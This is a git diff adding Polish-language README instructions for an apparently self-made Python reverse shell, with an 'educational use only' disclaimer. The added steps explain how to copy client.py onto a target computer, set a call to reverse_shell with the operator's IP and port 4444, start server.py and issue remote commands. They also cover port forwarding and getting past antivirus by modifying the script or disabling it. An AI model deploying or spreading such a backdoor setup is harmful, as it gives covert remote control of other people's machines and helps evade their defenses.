@@ -51,3 +51,59 @@ TryHackMe
 Używaj tego narzędzia zgodnie z prawem.
 Kod został stworzony wyłącznie w celach edukacyjnych.
 Sprawdź przepisy obowiązujące w Twoim kraju dotyczące testów penetracyjnych.
+
+
+
+
+
+
+
+
+Jak uruchomić na komputerze klienta
+
+1. Przygotowanie środowiska
+Na docelowym komputerze musi być zainstalowany Python 3.x. Jeśli nie jest zainstalowany, możesz go pobrać i zainstalować ze strony Python.org.
+
+2. Skopiowanie skryptu klienta na komputer docelowy
+Skopiuj plik client.py na komputer, na którym ma działać reverse shell.
+Możesz użyć pendrive'a, sieci lokalnej, dysku chmurowego (np. Google Drive), lub pobrać plik z repozytorium GitHub.
+Jeśli repozytorium jest publiczne, możesz pobrać je za pomocą polecenia git clone:
+Skopiuj kod
+git clone https://github.com/techwikr/Reverse-shell-w-pythonie
+
+Otwórz terminal lub wiersz poleceń na komputerze docelowym i przejdź do folderu zawierającego client.py.
+
+3. Konfiguracja klienta
+Otwórz plik client.py w edytorze tekstowym.
+Zmień adres IP i port na te, które odpowiadają Twojemu serwerowi:
+python
+Skopiuj kod
+reverse_shell("192.168.1.100", 4444)  # Zamień 192.168.1.100 na swój adres IP
+
+4. Uruchomienie serwera
+Na swoim komputerze (serwer):
+
+Uruchom plik server.py:
+
+Skopiuj kod
+python3 server.py
+
+Upewnij się, że zapora sieciowa (firewall) na Twoim komputerze oraz router pozwalają na nasłuchiwanie na wybranym porcie (np. 4444).
+5. Uruchomienie klienta na komputerze docelowym
+
+Na komputerze docelowym uruchom klienta:
+
+
+Skopiuj kod
+python3 client.py
+
+Po uruchomieniu klient nawiąże połączenie z Twoim serwerem, a Ty będziesz mógł przesyłać komendy.
+
+6. Test połączenia
+Na swoim serwerze wpisz komendę, np. ls (Linux/macOS) lub dir (Windows), aby zobaczyć listę plików w katalogu na komputerze docelowym.
+Odpowiedź powinna pojawić się w terminalu serwera.
+
+7. Zabezpieczenia i uwagi
+Firewall i NAT: Jeśli serwer i klient znajdują się w różnych sieciach, może być konieczne skonfigurowanie przekierowania portów (port forwarding) na routerze serwera.
+Antywirus: Niektóre programy antywirusowe mogą wykryć i zablokować działanie klienta. W takim przypadku należy dostosować skrypt lub wyłączyć antywirus w środowisku testowym.
+
